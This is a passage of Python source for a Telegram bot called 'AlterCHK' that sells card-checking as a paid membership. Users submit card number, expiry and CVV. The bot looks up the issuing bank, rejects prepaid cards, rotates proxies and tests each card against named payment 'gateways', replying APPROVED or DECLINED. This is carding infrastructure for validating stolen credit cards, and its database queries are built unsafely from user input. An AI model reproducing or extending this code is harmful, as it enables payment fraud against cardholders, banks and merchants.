    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDkill import CMDkill
        CheckRecive = await CMDkill(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'

        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#


@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["ab"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Anubis [ 15$ ]'
    TwoNameGateway = 'Gateway ↯ Anubis [ 15$ ]'
    ThreeGateway = 'Gateway 🔥 Anubis [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('ab')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDab import CMDab
        CheckRecive = await CMDab(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'

        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["au"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Auribe [ Auth ]'
    TwoNameGateway = 'Gateway ↯ Auribe [ Auth ]'
    ThreeGateway = 'Gateway 🔥 Auribe [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('au')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text
    try :
        if not re.sub("[^0-9]", "", VerMessage) :
            try :
                await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.MessageToEditNotFound:
                #await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.BadRequest:
                #await asyncio.sleep(e.value)
                return
    except TypeError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
